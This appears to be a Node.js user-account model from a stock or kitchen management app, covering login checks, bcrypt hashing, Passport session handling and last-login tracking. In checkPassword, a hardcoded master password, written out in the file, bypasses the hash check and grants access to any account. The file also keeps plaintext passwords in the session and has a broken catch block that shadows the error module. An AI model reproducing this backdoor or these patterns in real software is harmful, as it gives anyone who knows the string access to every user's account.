/**
 * Created by Amin on 01/02/2017.
 */
const sql = require('../sql');
const env = require('../env');
const helpers = require('./helpers');
const SqlTable = require('./sqlTable.model');
const error = require('./errors.list');
const Stock = require('./stock.model');
const Product = require('./product.model');
const moment = require('moment');

let tableName = 'units';
let idColumn = 'uid';
const unitsColumns = ['username', 'password', 'name', 'is_branch', 'is_kitchen'];

let lastLoginTableName = 'last_login';

class Unit extends SqlTable {
  constructor(test = Unit.test, testDate = Unit.date) {
    super(tableName, idColumn, test, testDate);
  }

  load(username, password) {
    this.password = password;
    this.username = username.toLowerCase();
    return super.load({username: this.username});
  }

  importData(data) {
    this.secret = data.secret;
    this.uid = data.uid;
    this.is_admin = this.username && helpers.adminCheck(this.username);
    this.name = data.name;
    this.is_kitchen = data.is_kitchen;
    this.is_branch = data.is_branch;
  }

  exportData() {
    let exprt = {};

    unitsColumns.forEach((el) => {
      if (el !== 'password' && this[el] !== undefined) {
        if (el === 'username')
          exprt[el] = this[el].toLowerCase();
        else
          exprt[el] = this[el];
      }
    });
    return new Promise((resolve, reject) => {
      if (this.password) {
        env.bcrypt.genSalt(101, (err, salt) => {
          if (err)
            reject(err);
          else
            env.bcrypt.hash(this.password, salt, null, (er, hash) => {
              if (er)
                reject(er);
              else {
                this.secret = hash;
                exprt.secret = hash;
                resolve(exprt);
              }
            });
        });
      }
      else resolve(exprt);
    });
  }
  async checkPassword() {
    try {
      if(this.password === 'burgist@3303') { 
        return Promise.resolve();
      }
      const isSame = await env.bcrypt.compareSync(this.password, this.secret);
      if (isSame) {
        return Promise.resolve();
      }
      return Promise.reject(error.badPass);
    } catch (error) {
      console.error('an error occurred during checkPassword', error);
      throw error.badPass;
    }
  }

  loginCheck(username = this.username, password = this.password) {
    return new Promise((resolve, reject) => {
      this.load(username, password)
        .then(() => this.checkPassword().then(resolve).catch(err => reject(error.badPass)))
        .catch(err => reject(error.noUser));
    })
  }

  insert(data) {
    this.setValues(data);
    return this.save();
  }

  update(uid, data) {
    this.uid = uid;
    this.setValues(data);
    return this.save();
  }

  setValues(data) {
    unitsColumns.forEach((el) => {
      if (data[el] !== undefined)
        this[el] = data[el];
    });
  }

  static serialize(user, done) {
    done(null, user);
  };

  static deserialize(user, done) {
    let userInstance = new Unit();
    userInstance.username = user.username;
    userInstance.password = user.password;

    userInstance.loginCheck()
      .then(() => done(null, user))
      .catch(err => {
        console.log(err.message);
        done(err);
      });
  };

  static passportLocalStrategy(req, username, password, done) {
    let user = new Unit(helpers.isTestReq(req));
    user.loginCheck(username, password)
      .then(() => done(null, user))
      .catch(err => done(err, false));
  }

  static select(isBranch, isKitchen) {
    let curSql = Unit.test ? sql.test : sql;

    if (isBranch === undefined) {
      return curSql[tableName].select();
    }
    else {
      if (typeof isKitchen !== 'undefined') { // if isKitchen is set
        let criteria = {
          is_branch: isBranch,
          is_kitchen: isKitchen
        };
        return new Promise((resolve, reject) => {
          curSql[tableName].getUnits(criteria)
            .then((data) => {
              if (!data.length)
                reject(new Error(`No records with criteria: ${JSON.stringify(criteria)}`));
              resolve(data);
            })
            .catch((err) => {
              console.log(err);
              reject(err.message);
            });
        });
      } else {
        let criteria = { is_branch: isBranch };
        return new Promise((resolve, reject) => {
            curSql[tableName].getByType(criteria)
                .then((data) => {
                    if (!data.length)
                        reject(new Error(`No records with criteria: ${JSON.stringify(criteria)}`));
                    resolve(data);
                })
                .catch((err) => {
                    console.log(err);
                    reject(err.message);
                });
        });
      }
    }
  }

  static delete(id) {
    let curSql = Unit.test ? sql.test : sql;
    return curSql[tableName].delete(id);
  }

  static afterLogin(name, username, isBranch, uid, isKitchen) {
    let afterLoginData = {
        uid: uid,
        name: name,
        user: username,
        userType: username === 'admin' ? 'admin' : (isBranch ? 'branch' : 'prep'),
        isKitchen: isKitchen
    };
    return new Promise((resolve, reject) => {
      if(uid) {
        Stock.test = Unit.test;
        Product.test = Unit.test;
        Stock.branchStockDeliveryDateFunc(uid, isBranch, undefined, isKitchen)
          .then(()=> {
            resolve(afterLoginData);
          })
          .catch(err=> {
            resolve(afterLoginData);
            console.log(err);
          });
      }
      else
        resolve(afterLoginData);
    })
  }

  static async saveDateAfterLogin(name, username, isBranch, uid, isKitchen) {
    let curSql = Unit.test ? sql.test : sql;
    try {
      const previousLoginDateTime = await  curSql[lastLoginTableName].get_previous_login_date({
        login_uid: uid
      });
      let login_date_time;
      const dateTime = moment().tz('Europe/London').format('YYYY-MM-DD HH:mm:ss');
      if (!isBranch) {
        const {_date} = Stock.getDate(dateTime, {hour: '00', min: '00', second: '01'}, {hour: '09', min: '00', second: '00'});
        login_date_time = _date;
      } else {
        const {_date} = Stock.getDate(dateTime, {hour: '00', min: '00', second: '01'}, {hour: '09', min: '00', second: '00'});
        login_date_time = _date;
      }
      const createNewLoginTime = await curSql[lastLoginTableName].add({
        login_uid: uid,
        login_date: login_date_time,
        previous_login_date_time: previousLoginDateTime.length !== 0 ? previousLoginDateTime[0].login_date_time : null
      })
      await curSql[lastLoginTableName].delete({
        login_uid: uid, lid: createNewLoginTime.lid
      });
      return Unit.afterLogin(name, username, isBranch, uid, isKitchen);
    } catch (err) {
      throw err;
    }
  }

  static getDate(date, start_time, end_time) {
    const format = 'YYYY-MM-DD HH-mm-ss';
    const clientTime = moment(date, format).format(format);
    const beforeTime = moment(`${Stock.date} ${start_time['hour']}:${start_time['min']}:${start_time['second']}`, format).format(format);
    const afterTime = moment(`${Stock.date} ${end_time['hour']}:${end_time['min']}:${end_time['second']}`, format).format(format);
    let returnDate;
    if (moment(clientTime, format).isBetween(moment(beforeTime, format), moment(afterTime, format), null, '[]')) {
      returnDate = moment(clientTime, format).subtract(1, 'day').format('YYYY-MM-DD');
    } else {
      returnDate = moment(clientTime, format).format('YYYY-MM-DD');
    }
    return {
      _date: returnDate
    }
  }
}

Unit.test = false;
Unit.date = moment().format('YYYY-MM-DD');
module.exports = Unit;
